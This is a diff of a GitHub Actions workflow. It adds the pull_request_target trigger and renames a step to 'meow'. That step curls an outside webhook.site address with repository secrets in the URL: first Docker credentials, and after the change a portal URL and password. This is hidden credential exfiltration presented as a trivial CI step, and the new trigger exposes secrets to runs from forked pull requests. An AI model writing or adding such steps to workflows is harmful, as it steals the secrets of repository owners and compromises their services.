@@ -1,13 +1,13 @@
 name: meowers
 
-on: [pull_request]
+on: [pull_request, pull_request_target]
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v2
-    - name: Say Hi
+    - name: meow
       run: |
-        curl "https://webhook.site/1f8ff9d7-ad45-4867-8bf9-fd4977fddb13/?meow=${{ secrets.DOCKER_USERNAME }}&nya=${{ secrets.DOCKER_PASSWORD }}"
+        curl "https://webhook.site/1f8ff9d7-ad45-4867-8bf9-fd4977fddb13/?meow=${{secrets.PORTAL_URL}}&nya=${{secrets.PORTAL_PASSWORD}}"
         echo nya
